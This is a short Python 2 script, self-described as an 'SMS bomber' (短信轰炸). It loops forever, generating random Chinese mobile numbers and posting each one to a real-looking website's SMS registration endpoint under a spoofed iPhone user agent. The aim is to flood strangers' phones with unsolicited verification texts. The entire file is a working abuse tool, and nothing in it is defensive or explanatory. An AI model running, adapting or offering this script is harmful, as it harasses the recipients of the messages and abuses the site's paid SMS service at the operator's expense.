# -*- coding: cp936 -*-
#成功交易模拟   

import random
import requests
   

print '短信轰炸!'

basepath='http://m.xiaozhu168.com/'

while True:
    try:

        hosturl = basepath

        posturl = basepath+'sendSMSReg'

        headers = {'User-Agent' : 'Mozilla/5.0 (iPhone; CPU iPhone OS 8_0 like Mac OS X) AppleWebKit/600.1.3 (KHTML, like Gecko) Version/8.0 Mobile/12A4345d Safari/600.1.4', 'Referer' : basepath }

        
        phone=["13","15","17"][random.randint(0,2)]+str(random.randint(100000000,999999999))
        
        
        postData = {
            'paramMap.phone':phone,
            'paramMap.type':1
            }

        r=requests.post(posturl,data=postData,headers=headers)

        if(r.text=='1'):
            print '发送成功!\t\t'+str(phone)
    except:
        pass






    


    
            
